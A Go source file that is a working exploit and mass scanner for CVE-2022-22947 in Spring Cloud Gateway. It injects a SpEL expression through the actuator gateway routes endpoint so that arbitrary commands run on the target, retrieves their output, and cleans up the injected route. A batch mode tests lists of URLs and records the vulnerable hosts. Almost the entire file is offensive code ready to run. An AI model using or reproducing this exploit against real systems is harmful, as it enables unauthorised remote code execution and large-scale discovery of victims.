package main

import (
	"bufio"
	"flag"
	"fmt"
	"github.com/go-resty/resty/v2"
	"github.com/panjf2000/ants/v2"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

func Between(str, starting, ending string) string {
	s := strings.Index(str, starting)
	if s < 0 {
		return ""
	}
	s += len(starting)
	e := strings.Index(str[s:], ending)
	if e < 0 {
		return ""
	}
	return str[s : s+e]
}

func RandString(len int) string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		b := r.Intn(26) + 65
		bytes[i] = byte(b)
	}
	return string(bytes)
}

var finalresult []string

func verify(target interface{}, runCommand string) {
	randStr := RandString(5)
	t := target.(string)

	//第一个请求(发送如下数据包即可添加一个包含恶意SpEL表达式的路由)
	client1 := resty.New()
	client1.SetTimeout(15 * time.Second)
	resp1, err := client1.R().
		SetHeader("Content-Type", "application/json").
		SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
		SetHeader("Accept-Language", "en").
		SetHeader("Accept-Encoding", "gzip, deflate").
		SetHeader("Accept", "*/*").
		SetBody(`{
      "id": "` + randStr + `",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"` + runCommand + `\"}).getInputStream()))}"}
        }],
      "uri": "http://example.com",
      "order": 0
    }`).
		Post(t + "/actuator/gateway/routes/" + randStr)

	if err != nil {
		fmt.Println("Request error: " + t)
	} else {
		if resp1.StatusCode() == http.StatusCreated {
			//第二个请求(刷新刚添加的路由)
			client2 := resty.New()
			client2.SetTimeout(15 * time.Second)
			resp2, err := client2.R().
				SetHeader("Content-Type", "application/x-www-form-urlencoded").
				SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
				Post(t + "/actuator/gateway/refresh")
			if err != nil {
				fmt.Println("Request error: " + t)
			} else {
				if resp2.StatusCode() == http.StatusOK {
					//第三个请求(查看执行结果)
					client3 := resty.New()
					client3.SetTimeout(15 * time.Second)
					resp3, err := client3.R().
						SetHeader("Content-Type", "application/x-www-form-urlencoded").
						SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
						Get(t + "/actuator/gateway/routes/" + randStr)

					bodyString := string(resp3.Body())
					if runCommand != "id" {
						fmt.Println(t, Between(bodyString, "AddResponseHeader Result =", "],"))
					} else {
						if strings.Contains(bodyString, "uid") {
							fmt.Println(t + " is vulnerable")
							finalresult = append(finalresult, t)
						}
					}
					if err != nil {
						fmt.Println("Request error: " + t)
					} else {
						if resp3.StatusCode() == http.StatusOK {

							//第四个请求(清理添加的路由)
							client4 := resty.New()
							client4.SetTimeout(15 * time.Second)
							resp4, err := client4.R().
								SetHeader("Content-Type", "application/x-www-form-urlencoded").
								SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
								Delete(t + "/actuator/gateway/routes/" + randStr)
							if err != nil {
								fmt.Println("Request error: " + t)
							} else {
								if resp4.StatusCode() == http.StatusOK {
									//第五个请求(刷新路由)

									client5 := resty.New()
									client5.SetTimeout(15 * time.Second)
									resp5, err := client4.R().
										SetHeader("Content-Type", "application/x-www-form-urlencoded").
										SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
										Post(t + "/actuator/gateway/refresh")
									if err != nil {
										fmt.Println("Request error: " + t)
									} else {
										if resp5.StatusCode() == http.StatusOK {
											return
										}
									}
								}
							}
						}
					}

				} else {
					return
				}

			}
		} else {
			return
		}
	}
}

func main() {
	var targetURL, runCommand, filepath string
	var thread int
	targets := []string{}

	flag.StringVar(&targetURL, "u", "", "")
	flag.StringVar(&filepath, "l", "", "")
	flag.StringVar(&runCommand, "c", "id", "")
	flag.IntVar(&thread, "t", 10, "")
	flag.CommandLine.Usage = func() {
		fmt.Println("执行命令：./CVE-2022-22947 -u http://127.0.0.1:8080 -c whoami ")
		fmt.Println("批量检测：./CVE-2022-22947 -l url.txt -t 20")
	}

	flag.Parse()

	if len(targetURL) == 0 {
		file, err := os.OpenFile(filepath, os.O_RDWR, 0666)
		if err != nil {
			fmt.Println("Open file error!", err)
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			if !strings.Contains(target, "http") {
				target = "http://" + target
			}
			targets = append(targets, target)
		}
		wg := sync.WaitGroup{}
		p, _ := ants.NewPoolWithFunc(thread, func(i interface{}) {
			verify(i, "id")
			wg.Done()
		})
		defer p.Release()

		for _, t := range targets {
			wg.Add(1)
			_ = p.Invoke(t)
		}
		wg.Wait()
		fileName := "vuln.txt"
		file, err = os.Create(fileName)
		if err != nil {
			return
		}
		defer file.Close()
		for _, v := range finalresult {
			file.WriteString(v + "\n")
		}

	} else {
		verify(targetURL, runCommand)
	}

}
